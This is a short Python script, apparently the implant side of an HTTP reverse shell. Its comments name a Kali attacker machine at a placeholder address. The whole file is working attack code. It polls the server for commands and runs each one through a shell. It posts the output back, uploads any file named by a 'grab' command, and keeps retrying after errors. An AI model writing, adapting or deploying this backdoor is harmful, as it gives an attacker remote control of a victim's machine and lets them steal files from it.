# pip install requests
import requests
import subprocess,time,os,random

def connect():
    while 1:
        # ip and post of kali
        req = requests.get('http://127.0.0.1:8080') # this line trigger the do_GET in kali and get command from server
        command = req.text
        # req.text contain the command that should be execute
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab , path = command.split("*")
            if os.path.exists(path):
                url = "http://127.0.0.1:8080/tmp"
                files = {'file': open(path, 'rb')}
                # dict contain key(tag) and value that is file object
                r = requests.post(url, files=files)
                #print(r)
            else:
                post_response = requests.post(url='http://127.0.0.1:8080',data='[-] NOT able to transfer data')
        else:
            CMD = subprocess.Popen(command,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())
    time.sleep(3)

while 1:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1,10) # 1 to 10 minute
        time.sleep(int(sleep_for))
        pass

     